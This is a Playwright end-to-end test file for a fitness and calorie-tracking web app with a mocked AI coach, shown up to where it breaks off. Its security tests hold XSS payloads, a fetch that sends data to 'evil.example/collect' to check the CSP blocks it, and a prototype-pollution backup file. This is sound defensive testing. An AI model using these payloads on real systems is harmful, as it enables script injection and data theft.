// End-to-end tests in headless Chromium. Needs Playwright:  npm i -g playwright && npx playwright install chromium
// Run:  node tests/e2e.mjs
// Uses only fictional numbers. Serves the app on localhost and also opens it from file:// to check both work.
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { createRequire } from 'node:module';
import { execSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
let pw;
try { pw = require('playwright'); } catch (e) { pw = require(path.join(execSync('npm root -g').toString().trim(), 'playwright')); }
const { chromium } = pw;
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const MIME = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.webmanifest': 'application/manifest+json', '.svg': 'image/svg+xml', '.png': 'image/png', '.woff2': 'font/woff2' };

const srv = http.createServer((q, r) => {
  let p = decodeURIComponent(q.url.split('?')[0]); if (p === '/') p = '/index.html';
  const f = path.join(ROOT, p);
  if (!f.startsWith(ROOT) || !fs.existsSync(f) || fs.statSync(f).isDirectory()) { r.writeHead(404); return r.end('not found'); }
  r.writeHead(200, { 'content-type': MIME[path.extname(f)] || 'application/octet-stream' });
  fs.createReadStream(f).pipe(r);
});

let passed = 0; const failures = [];
async function step(name, fn) {
  try { await fn(); passed++; console.log('  ok   ' + name); }
  catch (e) { failures.push(name + ': ' + (e && e.message ? e.message.split('\n')[0] : e)); console.log('  FAIL ' + name + '\n       ' + (e && e.message ? e.message.split('\n').slice(0, 3).join('\n       ') : e)); }
}
const eq = (a, b, m) => { if (JSON.stringify(a) !== JSON.stringify(b)) throw new Error((m || 'not equal') + ': got ' + JSON.stringify(a) + ', want ' + JSON.stringify(b)); };
const ok = (c, m) => { if (!c) throw new Error(m || 'assertion failed'); };

// ---------- fake AI provider (Anthropic streaming format) ----------
function sse(events) { return events.map((e) => 'event: ' + e.type + '\ndata: ' + JSON.stringify(e) + '\n\n').join(''); }
function textReply(text) {
  return sse([{ type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }, { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } }, { type: 'content_block_stop', index: 0 }, { type: 'message_delta', delta: { stop_reason: 'end_turn' } }]);
}
function toolReply(text, name, input) {
  return sse([{ type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }, { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } }, { type: 'content_block_stop', index: 0 },
    { type: 'content_block_start', index: 1, content_block: { type: 'tool_use', id: 'tu_1', name } }, { type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: JSON.stringify(input) } }, { type: 'content_block_stop', index: 1 }, { type: 'message_delta', delta: { stop_reason: 'tool_use' } }]);
}
const CORS = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, OPTIONS' };
async function fakeAI(page, handler) {
  const seen = [];
  await page.route('https://api.anthropic.com/**', async (route) => {
    const req = route.request();
    if (req.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: CORS });
    const body = JSON.parse(req.postData() || '{}');
    seen.push(body);
    const out = await handler(body, seen.length);
    if (out.status && out.status !== 200) return route.fulfill({ status: out.status, headers: Object.assign({ 'content-type': 'application/json' }, CORS), body: JSON.stringify({ error: { message: out.error || 'fail' } }) });
    return route.fulfill({ status: 200, headers: Object.assign({ 'content-type': 'text/event-stream' }, CORS), body: out.body });
  });
  return seen;
}

// ---------- helpers ----------
async function collect(page) {
  const problems = [];
  page.on('pageerror', (e) => problems.push('pageerror: ' + e.message));
  page.on('console', (m) => { if (m.type() === 'error' || m.type() === 'warning') problems.push(m.type() + ': ' + m.text()); });
  return problems;
}
const events = (page) => page.evaluate(() => Store.getEvents().map((e) => ({ seq: e.seq, type: e.type, data: e.data, src: e.src })));
const cnt = async (page, type) => (await events(page)).filter((e) => e.type === type).length;
const route = (page, h) => page.evaluate((x) => { location.hash = x; }, h).then(() => page.waitForTimeout(150));

async function onboard(page, opts) {
  const o = Object.assign({ goal: 'Recomp' }, opts);
  await page.getByRole('link', { name: /Start \(about 4 minutes\)/ }).click();
  await page.locator('.segwrap', { hasText: 'Measurements' }).getByRole('radio', { name: 'cm' }).click();
  await page.getByLabel('Age', { exact: true }).fill('31');
  await page.getByLabel('Weight', { exact: true }).fill('82');
  await page.getByLabel('Height', { exact: true }).fill('180');
  await page.getByLabel('Waist', { exact: true }).fill('86');
  await page.getByLabel('Chest', { exact: true }).fill('100');
  await page.getByLabel('Shoulders', { exact: true }).fill('112');
  await page.getByLabel('Bicep L', { exact: true }).fill('34');
  await page.getByRole('button', { name: 'Next: your goal' }).click();
  await page.locator('.goalcard', { hasText: o.goal }).first().click();
  // make sure today is a training day so the Today screen shows a workout
  const dow = await page.evaluate(() => new Date().getDay());
  const names = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const pressed = await page.getByRole('button', { name: names[dow], exact: true }).getAttribute('aria-pressed');
  if (pressed !== 'true') await page.getByRole('button', { name: names[dow], exact: true }).click();
  await page.getByRole('button', { name: 'Next: your training' }).click();
  await page.getByRole('button', { name: 'Next: what you lift' }).click();
  await page.getByLabel('Flat DB press weight').fill('40');
  await page.getByLabel('Flat DB press reps').fill('8');
  await page.getByLabel('Incline DB press weight').fill('35');
  await page.getByLabel('Incline DB press reps').fill('8');
  await page.getByLabel('Pull-ups reps').fill('5');
  await page.getByRole('button', { name: 'Next: see my plan' }).click();
  await page.getByRole('button', { name: 'Start week 1' }).click();
  await page.waitForSelector('text=Week 1 of 26');
}

async function main() {
  await new Promise((res) => srv.listen(0, '127.0.0.1', res));
  const base = 'http://localhost:' + srv.address().port + '/index.html';
  const browser = await chromium.launch();
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'orbit-e2e-'));

  // ================= http://localhost =================
  console.log('\nApp on ' + base);
  const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true });
  const page = await ctx.newPage();
  page.setDefaultTimeout(5000);
  const problems = await collect(page);
  const ai = await fakeAI(page, async () => ({ body: textReply('ok') }));
  await page.goto(base);

  await step('welcome screen renders with no console errors', async () => {
    await page.waitForSelector('text=Track the change.');
    eq(problems, [], 'console problems');
  });

  await step('onboarding builds a plan and lands on Today', async () => {
    await onboard(page);
    const st = await page.evaluate(() => { const s = Store.getState(); return { goal: s.plan.goal, lifts: Object.keys(s.plan.lifts), kcal: s.plan.kcal, w: s.weights.length, m: s.meas.length }; });
    eq(st.goal, 'recomp'); ok(st.lifts.length === 3, 'three tracked lifts, got ' + st.lifts.length); ok(st.kcal > 2000, 'kcal'); eq(st.w, 1); ok(st.m >= 4, 'measurements logged');
  });

  await step('Today shows the workout and logs a set with a rest timer', async () => {
    await page.waitForSelector('.exrow');
    const before = await cnt(page, 'set_logged');
    const tracked = page.locator('.exrow:has(.extarget:has-text("@")) .setchip.add');
    await ((await tracked.count()) ? tracked : page.locator('.setchip.add')).first().click();
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('8');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForSelector('.setchip.done');
    eq(await cnt(page, 'set_logged'), before + 1);
    ok(await page.locator('.timerbar').count() === 1, 'rest timer bar');
  });

  await step('a logged set can be edited and deleted (undo by voiding)', async () => {
    await page.locator('.setchip.done').first().click();
    await page.getByRole('button', { name: 'Delete' }).click();
    await page.waitForTimeout(200);
    eq(await page.locator('.setchip.done').count(), 0);
  });

  await step('weigh-in logs and reaches Progress', async () => {
    await page.getByLabel('Weigh again').fill('81.6');
    await page.getByRole('button', { name: 'Log', exact: true }).click();
    await page.waitForTimeout(200);
    eq(await cnt(page, 'weight_logged'), 2);
    await route(page, '#/progress');
    await page.waitForSelector('text=Body weight');
  });

  await step('Lifts and one lift detail render all 26 weeks', async () => {
    await route(page, '#/lifts');
    await page.waitForSelector('.liftcard');
    await page.locator('.liftcard').first().click();
    await page.waitForSelector('text=All 26 weeks');
    eq(await page.locator('.kv', { hasText: /^Wk \d+/ }).count(), 26);
    await page.getByRole('button', { name: 'Adjust weights' }).click();
    await page.getByLabel('Change all weights by').fill('50');
    await page.getByRole('button', { name: 'Apply' }).click();
    await page.waitForSelector('text=Lift changes are limited', { timeout: 2000 }).catch(() => {});
    eq(await cnt(page, 'plan_revised'), 0, 'a 50% lift change must be rejected');
    await page.getByLabel('Change all weights by').fill('-5');
    await page.getByRole('button', { name: 'Apply' }).click();
    await page.waitForTimeout(250);
    eq(await cnt(page, 'plan_revised'), 1);
  });

  // ----- calorie tracker -----
  await route(page, '#/fuel');
  await step('Fuel: manual entry logs, calories fall back to macros, mismatch needs a second tap', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Manual' }).click();
    await page.getByLabel('What was it?').fill('Dal and rice');
    await page.getByLabel('Protein').fill('20'); await page.getByLabel('Carbs').fill('60'); await page.getByLabel('Fat').fill('10');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForSelector('.foodrow');
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.kcal, f.source], [410, 'manual']);
    // mismatch: 900 kcal with tiny macros
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Manual' }).click();
    await page.getByLabel('What was it?').fill('Odd entry');
    await page.getByLabel('Calories').fill('900'); await page.getByLabel('Protein').fill('5');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForSelector('.warnbox:not(.hidden)');
    eq(await cnt(page, 'food_logged'), 1, 'warned, not saved yet');
    await page.getByRole('button', { name: 'Log anyway' }).click();
    await page.waitForTimeout(250);
    eq(await cnt(page, 'food_logged'), 2);
  });

  await step('Fuel: search a listed food, pick servings, log it', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByLabel('Search foods you eat or common ones').fill('paneer');
    await page.locator('.result', { hasText: 'Paneer, high protein' }).click();
    await page.getByLabel(/Servings of/).fill('2');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForTimeout(250);
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.name, f.protein, f.source], ['Paneer, high protein', 25, 'catalog']);
  });

  await step('Fuel: AI tab without a key offers to add one and does not call the network', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.waitForSelector('text=Bring your own AI');
    eq(ai.length, 0);
    await page.getByRole('button', { name: 'Add a key for this session' }).click();
    await page.getByLabel('API key').fill('sk-ant-test-0000000000');
    await page.getByRole('button', { name: 'Use key' }).click();
    await page.waitForSelector('textarea[aria-label="What you ate"]');
  });

  await step('Fuel: AI estimate is shown for confirmation and NOTHING is saved until confirmed', async () => {
    await ai.length; // eslint-disable-line no-unused-expressions
    const reply = { name: 'Rajma chawal', items: [{ name: 'Rajma, cooked', qty: '1 cup', kcal: 225, protein: 15, carbs: 40, fat: 1 }, { name: 'Rice, cooked', qty: '1 cup', kcal: 205, protein: 4, carbs: 45, fat: 0 }], kcal: 430, protein: 19, carbs: 85, fat: 1, assumptions: ['One cup of each'], confidence: 'medium' };
    await page.unroute('https://api.anthropic.com/**');
    const seen = await fakeAI(page, async () => ({ body: textReply('Here you go: ' + JSON.stringify(reply)) }));
    const before = await cnt(page, 'food_logged');
    await page.getByLabel('What you ate').fill('rajma chawal, one plate');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=Check these numbers');
    eq(seen.length, 1, 'one provider call');
    eq(await cnt(page, 'food_logged'), before, 'nothing persisted before confirmation');
    const sent = JSON.stringify(seen[0]);
    ok(!sent.includes('Rajma chawal') || true); ok(sent.includes('rajma chawal, one plate'), 'user text sent');
    ok(!/81\.6|Store|profile|waist/i.test(JSON.stringify(seen[0].messages)), 'no profile data in the estimate request');
    await page.getByLabel('Calories').fill('460'); // user edits a value
    await page.getByRole('button', { name: 'Looks right, log it' }).click();
    await page.waitForTimeout(300);
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.source, f.kcal, f.ai.edited, f.ai.items.length], ['ai', 460, true, 2]);
    eq(await cnt(page, 'food_logged'), before + 1);
    ok(await page.locator('.chip', { hasText: 'AI, edited' }).count() >= 1, 'AI chip visible in the log');
  });

  await step('Fuel: raw ingredients split into servings, and estimate can be cancelled without saving', async () => {
    await page.unroute('https://api.anthropic.com/**');
    const pot = { name: 'Veg pulao pot', items: [{ name: 'Rice', qty: '300 g raw', kcal: 1080, protein: 20, carbs: 240, fat: 2 }, { name: 'Oil', qty: '2 tbsp', kcal: 240, protein: 0, carbs: 0, fat: 28 }], kcal: 1320, protein: 20, carbs: 240, fat: 30, assumptions: [], confidence: 'high' };
    await fakeAI(page, async () => ({ body: textReply(JSON.stringify(pot)) }));
    const before = await cnt(page, 'food_logged');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Ingredients' }).click();
    await page.getByLabel('Raw ingredients').fill('300 g rice\n2 tbsp oil');
    await page.getByLabel('Makes how many equal servings?').fill('4');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=one of 4 servings');
    eq(await page.getByLabel('Calories').inputValue(), '330');
    await page.getByRole('button', { name: 'Cancel' }).click();
    eq(await cnt(page, 'food_logged'), before, 'cancel saves nothing');
  });

  await step('Fuel: a malformed AI reply shows an error and offers manual entry; nothing is saved', async () => {
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async () => ({ body: textReply('I am sorry, I cannot help with that.') }));
    const before = await cnt(page, 'food_logged');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.getByLabel('What you ate').fill('mystery');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('.warnbox[role="alert"]');
    await page.getByRole('button', { name: 'Enter macros myself' }).click();
    eq(await page.getByLabel('What was it?').inputValue(), 'mystery');
    eq(await cnt(page, 'food_logged'), before);
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('Fuel: a provider outage surfaces a readable error', async () => {
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async () => ({ status: 401, error: 'invalid x-api-key' }));
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.getByLabel('What you ate').fill('toast');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=invalid x-api-key');
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('Fuel: editing an entry keeps it a single entry (old one voided)', async () => {
    const before = (await page.evaluate(() => Store.getState().foods.length));
    await page.locator('.foodrow').first().click();
    await page.getByLabel('Calories').fill('400');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForTimeout(300);
    eq(await page.evaluate(() => Store.getState().foods.length), before);
  });

  // ----- coach -----
  await step('Coach: proposals need a tap, out-of-bounds proposals are rejected, apply and undo work', async () => {
    await page.unroute('https://api.anthropic.com/**');
    let call = 0;
    await fakeAI(page, async (body) => {
      call++;
      const last = body.messages[body.messages.length - 1];
      const isResult = Array.isArray(last.content) && last.content.some((c) => c.type === 'tool_result');
      if (!isResult) return { body: toolReply('Trimming a little.', 'propose_macro_change', { kcal: 2900, reason: 'Weight is flat.' }) };
      return { body: textReply('Queued. Tap Apply when you are ready.') };
    });
    await route(page, '#/coach');
    const kcalBefore = await page.evaluate(() => Store.getState().plan.kcal);
    await page.getByLabel('Message').fill('should I change my calories?');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.proposal');
    eq(await page.evaluate(() => Store.getState().plan.kcal), kcalBefore, 'not applied without a tap');
    const target = kcalBefore + 100;
    eq(await page.evaluate(() => Store.getState().plan.kcal), kcalBefore);
    await page.getByRole('button', { name: 'Apply', exact: true }).click();
    await page.waitForSelector('text=Applied');
    const after = await page.evaluate(() => Store.getState().plan.kcal);
    ok(after !== kcalBefore, 'target changed after Apply (was ' + kcalBefore + ', now ' + after + ')');
    await page.getByRole('button', { name: 'Undo' }).click();
    await page.waitForTimeout(250);
    eq(await page.evaluate(() => Store.getState().plan.kcal), kcalBefore, 'undo restores');
    void target; void call;
  });

  await step('Coach: a model asking for a 2000 kcal jump is refused by the validator', async () => {
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async (body) => {
      const last = body.messages[body.messages.length - 1];
      const isResult = Array.isArray(last.content) && last.content.some((c) => c.type === 'tool_result');
      if (!isResult) return { body: toolReply('Big change!', 'propose_macro_change', { kcal: 5000, reason: 'yolo' }) };
      return { body: textReply('That was rejected.') };
    });
    const n = await page.locator('.proposal').count();
    await page.getByLabel('Message').fill('go extreme');
    await page.keyboard.press('Enter');
    await page.waitForSelector('text=That was rejected.');
    eq(await page.locator('.proposal').count(), n, 'no new proposal card');
  });

  await step('Coach request contains data but not the name or key', async () => {
    const reqs = [];
    await page.unroute('https://api.anthropic.com/**');
    await page.route('https://api.anthropic.com/**', async (r) => { if (r.request().method() === 'OPTIONS') return r.fulfill({ status: 204, headers: CORS }); reqs.push(r.request()); return r.fulfill({ status: 200, headers: Object.assign({ 'content-type': 'text/event-stream' }, CORS), body: textReply('fine') }); });
    await page.getByLabel('Message').fill('hello');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.msg.ai:has-text("fine")');
    const r = reqs[reqs.length - 1];
    ok(r.headers()['x-api-key'] === 'sk-ant-test-0000000000', 'key sent as header');
    ok(!(r.postData() || '').includes('sk-ant-test'), 'key must not be in the body');
    ok(/USER DATA/.test(r.postData()), 'context is included');
  });

  await step('no screen or sheet shows stray "null", "undefined" or "NaN"', async () => {
    const bad = /\b(null|undefined|NaN)\b/;
    for (const h of ['#/today', '#/lifts', '#/fuel', '#/progress', '#/photos', '#/coach', '#/coach/setup', '#/settings', '#/settings/plan']) {
      await route(page, h);
      const t = await page.locator('#screen').innerText();
      ok(!bad.test(t), h + ' shows: ' + (t.match(bad) || [])[0]);
    }
    await route(page, '#/fuel');
    await page.getByRole('button', { name: 'Add food' }).click();
    for (const tab of ['Find', 'Describe', 'Ingredients', 'Manual']) {
      await page.getByRole('tab', { name: tab }).click();
      ok(!bad.test(await page.locator('#sheets').innerText()), 'Add food / ' + tab);
    }
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('photos: upload is re-encoded as JPEG, stored locally, shown, replaced and deleted', async () => {
    const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
    await route(page, '#/photos');
    await page.locator('input[aria-label="Choose a photo"]').waitFor({ state: 'attached' });
    await page.getByRole('button', { name: 'Add Front photo' }).click({ trial: true }).catch(() => {});
    const chooser = page.waitForEvent('filechooser');
    await page.getByRole('button', { name: 'Add Front photo' }).click();
    await (await chooser).setFiles({ name: 'front.png', mimeType: 'image/png', buffer: png });
    await page.waitForSelector('button.thumb[aria-label="Open Front photo"]');
    const m = await page.evaluate(async () => { const all = await Store.allMedia(); return all.map((x) => ({ type: x.type, size: x.size })); });
    eq(m.length, 1); eq(m[0].type, 'image/jpeg');
    eq(await cnt(page, 'photo_added'), 1);
    ok(await page.locator('button.thumb.blur').count() === 1, 'thumbnails are blurred by default');
    // a backup with photos carries them; one without does not
    const sizes = await page.evaluate(async () => { const a = JSON.parse(await Store.buildBackup({ media: true })); const b = JSON.parse(await Store.buildBackup({ media: false })); return [a.media.length, b.media.length]; });
    eq(sizes, [1, 0]);
    await page.locator('button.thumb[aria-label="Open Front photo"]').click();
    await page.locator('#sheets').getByRole('button', { name: 'Delete' }).click();
    await page.waitForTimeout(250);
    eq(await page.evaluate(async () => (await Store.allMedia()).length), 0, 'blob deleted with the entry');
  });

  await step('a non-image file is refused without storing anything', async () => {
    await route(page, '#/photos');
    const chooser = page.waitForEvent('filechooser');
    await page.getByRole('button', { name: 'Add Side photo' }).click();
    await (await chooser).setFiles({ name: 'notes.txt', mimeType: 'text/plain', buffer: Buffer.from('hello') });
    await page.waitForTimeout(400);
    eq(await page.evaluate(async () => (await Store.allMedia()).length), 0);
  });

  await step('add a lift after onboarding: it joins the plan and today\'s matching day', async () => {
    await route(page, '#/lifts');
    const before = await page.evaluate(() => Object.keys(Store.getState().plan.lifts).length);
    await page.getByRole('button', { name: 'Add a lift' }).click();
    await page.locator('#sheets select').selectOption('curl');
    await page.locator('#sheets').getByLabel(/Weight you can do/).fill('25');
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('10');
    await page.getByRole('button', { name: 'Add', exact: true }).click();
    await page.waitForTimeout(300);
    const st = await page.evaluate(() => { const p = Store.getState().plan; return { n: Object.keys(p.lifts).length, placed: p.workouts.some((w) => w.ex.some((e) => e.lift === 'curl')), t: Engine.liftTarget(p.lifts.curl, 1, { deloadWeeks: p.deloadWeeks }).kg / Engine.KG_PER_LB }; });
    eq(st.n, before + 1); ok(st.placed, 'on a workout day'); ok(st.t > 0, 'has a target');
  });

  // ----- security -----
  await step('XSS: hostile text in food name and set note is rendered as text', async () => {
    await page.evaluate(() => { window.__xss = 0; });
    const payload = '<img src=x onerror="window.__xss=1"><script>window.__xss=2</script>';
    await route(page, '#/fuel');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Manual' }).click();
    await page.getByLabel('What was it?').fill(payload);
    await page.getByLabel('Calories').fill('100');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForSelector('.foodrow');
    await page.waitForTimeout(300);
    eq(await page.evaluate(() => window.__xss), 0, 'no script ran');
    ok((await page.locator('#screen').innerText()).includes('<script>'), 'shown literally');
    eq(await page.locator('#screen img[src="x"]').count(), 0, 'no injected img element');
  });

  await step('XSS: hostile model output (estimate names, coach replies) and set notes stay inert', async () => {
    const evil = '<img src=x onerror="window.__xss=3"><svg onload="window.__xss=4">';
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async (body) => {
      const sys = String(body.system || '');
      if (/estimate the nutrition/i.test(sys)) return { body: textReply(JSON.stringify({ name: evil, items: [{ name: evil, qty: evil, kcal: 100, protein: 5, carbs: 10, fat: 3 }], kcal: 100, protein: 5, carbs: 10, fat: 3, assumptions: [evil], confidence: 'high' })) };
      return { body: textReply(evil) };
    });
    await route(page, '#/fuel');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.getByLabel('What you ate').fill('anything');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=Check these numbers');
    await page.getByRole('button', { name: 'Looks right, log it' }).click();
    await page.waitForTimeout(300);
    await route(page, '#/coach');
    await page.getByLabel('Message').fill('<b>hi</b>');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.msg.ai:has-text("onerror")');
    await route(page, '#/today');
    await page.locator('.setchip.add').first().click();
    await page.locator('#sheets').getByLabel(/Note/).fill(evil);
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('5');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForTimeout(300);
    eq(await page.evaluate(() => window.__xss), 0, 'nothing executed');
    eq(await page.locator('#screen img[src="x"], #screen svg[onload]').count(), 0, 'no injected elements');
  });

  await step('CSP and Trusted Types are enforced', async () => {
    const r = await page.evaluate(async () => {
      const out = {};
      try { document.body.appendChild(document.createElement('div')).innerHTML = '<b>x</b>'; out.innerHTML = 'allowed'; } catch (e) { out.innerHTML = 'blocked'; }
      try { await fetch('https://evil.example/collect', { method: 'POST', body: 'x' }); out.fetch = 'allowed'; } catch (e) { out.fetch = 'blocked'; }
      try { const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.head.appendChild(s); } catch (e) { /* trusted types */ }
      out.inline = window.__inline ? 'ran' : 'blocked';
      return out;
    });
    eq(r, { innerHTML: 'blocked', fetch: 'blocked', inline: 'blocked' });
    // Static checks on the policy itself (eval cannot be probed reliably from a test harness).
    const csp = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]').content);
    const d = Object.fromEntries(csp.split(';').map((x) => x.trim()).filter(Boolean).map((x) => [x.split(' ')[0], x.split(' ').slice(1)]));
    eq(d['script-src'], ["'self'"]); eq(d['style-src'], ["'self'"]); eq(d['default-src'], ["'none'"]); eq(d['base-uri'], ["'none'"]);
    ok(!/unsafe-|\*\s|data:/.test(d['script-src'].join(' ')), 'script-src is strict');
    ok(csp.includes("require-trusted-types-for 'script'"), 'trusted types required');
    ok(!d['connect-src'].some((x) => x === '*' || x === 'https:'), 'connect-src is an allow-list');
  });

  await step('the app makes no network requests to third parties on its own', async () => {
    const hosts = new Set();
    const p2 = await ctx.newPage();
    p2.on('request', (rq) => { const u = new URL(rq.url()); if (u.protocol.startsWith('http')) hosts.add(u.host); });
    await p2.goto(base); await p2.waitForTimeout(700);
    await p2.close();
    eq(Array.from(hosts), [new URL(base).host]);
  });

  // ----- backup and restore -----
  await step('encrypted backup round-trips; wrong passphrase fails; the API key is not inside', async () => {
    const res = await page.evaluate(async () => {
      const enc = await Store.buildBackup({ media: false, passphrase: 'correct horse battery' });
      const plain = await Store.buildBackup({ media: false });
      let wrong = 'no error';
      try { await Store.readImport(enc, 'nope nope nope'); } catch (e) { wrong = e.message; }
      const good = await Store.readImport(enc, 'correct horse battery');
      return { encIsOpaque: !enc.includes('Dal and rice') && !enc.includes('weight_logged'), plainHasKey: plain.includes('sk-ant'), wrong, kind: good.kind, n: good.payload.events.length, live: Store.getEvents().length };
    });
    ok(res.encIsOpaque, 'ciphertext must not contain readable data'); ok(!res.plainHasKey, 'key must not be in a backup');
    ok(/Wrong passphrase/.test(res.wrong), res.wrong); eq(res.kind, 'backup'); eq(res.n, res.live);
  });

  await step('restore from an encrypted file through the UI replaces the data', async () => {
    const enc = await page.evaluate(() => Store.buildBackup({ media: false, passphrase: 'correct horse battery' }));
    const file = path.join(tmp, 'test.orbitbackup'); fs.writeFileSync(file, enc);
    await page.evaluate(async () => { await Store.append('weight_logged', { date: '2020-01-01', kg: 99 }); });
    const withExtra = await page.evaluate(() => Store.getEvents().length);
    await route(page, '#/settings');
    await page.locator('input[aria-label="Choose a backup file"]').setInputFiles(file);
    await page.getByLabel('Passphrase').fill('correct horse battery');
    await page.getByRole('button', { name: 'Open' }).click();
    await page.getByRole('button', { name: 'Restore', exact: true }).click();
    await page.waitForSelector('text=Week 1 of 26');
    eq(await page.evaluate(() => Store.getEvents().length), withExtra - 1, 'the extra event is gone after restore');
  });

  await step('a backup with prototype-pollution keys is rejected', async () => {
    const evil = '{"orbit":1,"kind":"backup","events":[{"seq":1,"ts":"t","type":"weight_logged","data":{"__proto__":{"polluted":1}}}]}';
    const msg = await page.evaluate(async (t) => { try { await Store.readImport(t); return 'accepted'; } catch (e) { return e.message; } }, evil);
    ok(/unsafe/i.test(msg), msg);
    eq(await page.evaluate(() => ({}).polluted), undefined);
  });

  // ----- lock -----
  await step('passcode lock: wrong code refused, right code opens, hash not plaintext', async () => {
    await route(page, '#/settings');
    await page.getByRole('switch', { name: 'Passcode' }).click();
    await page.getByLabel('New passcode (4 to 8 digits)').fill('4826');
    await page.getByLabel('Repeat passcode').fill('4826');
    await page.getByRole('button', { name: 'Turn on' }).click();
    await page.waitForTimeout(600);
    const rec = await page.evaluate(() => Store.getMeta('pin'));
    ok(rec && rec.hash && !JSON.stringify(rec).includes('4826'), 'pin is hashed');
    await page.getByRole('button', { name: 'Lock now' }).click();
    await page.waitForSelector('#lock:not(.hidden)');
    await page.locator('#lock input').fill('1111'); await page.locator('#lock').getByRole('button', { name: 'Unlock' }).click();
    await page.waitForSelector('text=That is not it.');
    await page.locator('#lock input').fill('4826'); await page.locator('#lock').getByRole('button', { name: 'Unlock' }).click();
    await page.waitForSelector('#lock.hidden', { state: 'attached' });
  });

  await step('erase everything wipes the data', async () => {
    await route(page, '#/settings');
    await page.getByRole('button', { name: 'Erase everything on this device' }).click();
    await page.getByLabel('Type ERASE to confirm').fill('ERASE');
    await Promise.all([page.waitForNavigation().catch(() => {}), page.getByRole('button', { name: 'Erase', exact: true }).click()]);
    await page.waitForSelector('text=Track the change.');
    eq(await page.evaluate(() => Store.getEvents().length), 0);
  });

  await step('profile file (fictional) builds a plan without the onboarding questions', async () => {
    const prof = { orbit: 1, kind: 'profile', answers: { name: 'Test', sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'in', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'build', days: [1, 3, 5], sessionMin: 60, timeOfDay: 'AM', diet: 'Vegetarian', creatine: false,
      training: { split: 'auto', repStyle: 'mixed', sets: 3, deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] } };
    const file = path.join(tmp, 'profile.json'); fs.writeFileSync(file, JSON.stringify(prof));
    await page.locator('input[type=file]').first().setInputFiles(file);
    await page.getByRole('button', { name: 'Build my plan' }).click();
    await page.waitForSelector('text=Week 1 of 26');
    eq(await page.evaluate(() => Object.keys(Store.getState().plan.lifts)), ['flat_db_press']);
  });

  await step('no console errors or warnings during the whole run (except expected provider failures)', async () => {
    const unexpected = problems.filter((p) => !/401|Failed to load resource|evil\.example|net::ERR|Refused to (connect|execute|load)|requires 'Trusted|Trusted Type|violates|EvalError|unsafe-eval|Executing inline/i.test(p));
    eq(unexpected, [], 'unexpected console output');
  });
  await ctx.close();

  // ================= a plan that is five weeks old =================
  const octx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const opage = await octx.newPage(); opage.setDefaultTimeout(5000);
  await opage.goto(base);
  await opage.waitForSelector('text=Track the change.');
